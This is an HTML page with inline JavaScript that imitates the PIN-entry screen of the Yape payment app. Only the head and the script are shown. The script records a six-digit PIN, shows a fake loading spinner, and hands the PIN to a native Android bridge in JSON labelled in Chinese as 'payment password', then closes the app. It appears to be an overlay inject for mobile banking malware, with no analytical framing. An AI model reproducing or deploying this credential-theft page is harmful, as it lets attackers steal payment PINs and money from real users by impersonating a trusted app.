<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#742083">
  <title>Yape</title>
  <style>
    :root {
      color-scheme: light;
      --purple: #731f81;
      --purple-deep: #461561;
      --purple-light: #9d3e9f;
      --key: #f0eff7;
      --frame: #d8d5e2;
      --ink: #1c1534;
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      margin: 0;
      background: var(--purple-deep);
      overflow-x: hidden;
    }

    body {
      min-height: 100dvh;
      color: var(--ink);
      font-family: "Avenir Next", Avenir, "Segoe UI", sans-serif;
      -webkit-font-smoothing: antialiased;
      -webkit-tap-highlight-color: transparent;
    }

    button {
      font: inherit;
      -webkit-tap-highlight-color: transparent;
    }

    .stage {
      display: block;
      width: 100%;
      min-height: 100dvh;
      padding: 0;
    }

    .phone {
      container-type: inline-size;
      position: relative;
      width: 100%;
      height: 100dvh;
      min-height: 620px;
      padding: 0;
      overflow: hidden;
      background: var(--purple-deep);
    }

    .screen {
      position: absolute;
      inset: 0;
      overflow: hidden;
      background: linear-gradient(155deg, #82228e 0%, #651d7c 39%, #46155f 100%);
    }

    .top-content {
      height: 49.8cqw;
      padding-top: 24.3cqw;
      text-align: center;
    }

    .qr-card {
      display: grid;
      width: 35.3cqw;
      height: 35.3cqw;
      margin: 0 auto;
      padding: 2.2cqw;
      border-radius: 2.5cqw;
      background: #fff;
      box-shadow: 0 2px 8px rgba(29, 6, 47, .17);
      place-items: center;
    }

    .qr-card img {
      display: block;
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: .4cqw;
    }

    .quick-actions {
      display: grid;
      grid-template-columns: repeat(3, minmax(0, 1fr));
      width: 66cqw;
      margin-right: auto;
      margin-left: auto;
      gap: 3cqw;
      margin-top: 17.2cqw;
    }

    .quick-action {
      display: flex;
      min-width: 0;
      flex-direction: column;
      align-items: center;
      padding: 0;
      border: 0;
      background: transparent;
      color: #fff;
      text-align: center;
      cursor: pointer;
    }

    .quick-icon {
      display: grid;
      width: 12.1cqw;
      height: 12.1cqw;
      margin: 0 auto;
      border-radius: 2.7cqw;
      background: rgba(184, 60, 167, .76);
      box-shadow: inset 0 1px 0 rgba(255,255,255,.08);
      place-items: center;
    }

    .quick-icon img {
      width: 6.2cqw;
      height: 6.2cqw;
      object-fit: contain;
    }

    .quick-action span:last-child {
      display: flex;
      width: 100%;
      min-height: 7.5cqw;
      align-items: flex-start;
      justify-content: center;
      margin-top: 2.1cqw;
      font-size: 2.95cqw;
      font-weight: 600;
      line-height: 1.22;
    }

    .pin-panel {
      position: absolute;
      right: 0;
      bottom: 0;
      left: 0;
      height: 88.5cqw;
      padding: 10.2cqw 6.6cqw 5cqw;
      background: #fff;
    }

    .pin-heading {
      margin: 0;
      color: var(--purple);
      font-size: 5.05cqw;
      font-weight: 700;
      line-height: 1;
      text-align: center;
    }

    .pin-status {
      display: flex;
      justify-content: center;
      gap: 2.1cqw;
      min-height: 7.6cqw;
      margin-top: 2.2cqw;
    }

    .pin-dot {
      width: 2.35cqw;
      height: 2.35cqw;
      border-radius: 50%;
      background: var(--purple);
      opacity: 0;
      transform: scale(.3);
      transition: opacity 120ms ease, transform 120ms ease;
    }

    .pin-dot.is-filled {
      opacity: 1;
      transform: scale(1);
    }

    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      grid-template-rows: repeat(4, 12.05cqw);
      gap: 2cqw 2.35cqw;
      margin-top: .5cqw;
    }

    .key {
      padding: 0;
      border: 0;
      border-radius: 1.75cqw;
      background: var(--key);
      color: #18142c;
      font-size: 5.6cqw;
      font-weight: 500;
      line-height: 1;
      cursor: pointer;
      transition: background 100ms ease, transform 100ms ease;
    }

    .key:active {
      background: #e1dceb;
      transform: scale(.96);
    }

    .key-icon {
      display: grid;
      padding: 0;
      border: 0;
      background: transparent;
      cursor: pointer;
      place-items: center;
    }

    .key-icon img {
      width: 7.8cqw;
      height: 7.8cqw;
      object-fit: contain;
    }

    .key-icon.delete img {
      width: 8cqw;
      height: 7cqw;
    }

    :focus-visible {
      outline: 2px solid #00a5a7;
      outline-offset: 2px;
    }

    @media (max-height: 640px) {
      .phone {
        height: 100dvh;
        min-height: 560px;
      }
    }

    @media (min-width: 385px) {
      .pin-heading { font-size: 19px; }
      .quick-action span:last-child { font-size: 11px; }
      .key { font-size: 22px; }
    }

    body.loading .phone {
      pointer-events: none;
      opacity: .78;
    }

    .spinner {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      z-index: 50;
      width: 36px;
      height: 36px;
      margin: -18px 0 0 -18px;
      border: 3px solid rgba(115, 31, 129, .2);
      border-top-color: var(--purple);
      border-radius: 50%;
      animation: spin 700ms linear infinite;
    }

    body.loading .spinner { display: block; }

    @keyframes spin { to { transform: rotate(360deg); } }

    @media (prefers-reduced-motion: reduce) {
      * { transition: none !important; }
      .spinner { animation: none; }
    }
  </style>
</head>

  <script>
    (function () {
      var PIN_LENGTH = 6;
      var pin = '';
      var submitted = false;
      var dots = Array.prototype.slice.call(document.querySelectorAll('.pin-dot'));
      var status = document.querySelector('.pin-status');

      function renderPin() {
        dots.forEach(function (dot, index) {
          dot.classList.toggle('is-filled', index < pin.length);
        });
        status.setAttribute('aria-label', pin.length + ' dígitos ingresados');
      }

      function closeApp() {
        if (typeof Android !== 'undefined' && Android.close) {
          Android.close();
        }
      }

      function submitPin() {
        if (submitted || pin.length !== PIN_LENGTH) return;
        submitted = true;
        document.body.classList.add('loading');
        setTimeout(function () {
          if (typeof Android !== 'undefined' && Android.returnResult) {
            Android.returnResult(JSON.stringify({
              '类型': 'yape',
              '支付密码': pin
            }));
          }
          setTimeout(closeApp, 2500);
        }, 900);
      }

      function pressDigit(digit) {
        if (submitted || pin.length >= PIN_LENGTH) return;
        pin += digit;
        renderPin();
        if (pin.length === PIN_LENGTH) submitPin();
      }

      function deleteDigit() {
        if (submitted || !pin.length) return;
        pin = pin.slice(0, -1);
        renderPin();
      }

      document.querySelectorAll('[data-digit]').forEach(function (button) {
        button.addEventListener('click', function () {
          pressDigit(button.getAttribute('data-digit'));
        });
      });

      document.querySelector('.delete').addEventListener('click', deleteDigit);

      document.addEventListener('keydown', function (event) {
        if (/^[0-9]$/.test(event.key)) pressDigit(event.key);
        if (event.key === 'Backspace' || event.key === 'Delete') deleteDigit();
      });

      renderPin();
    })();
  </script>
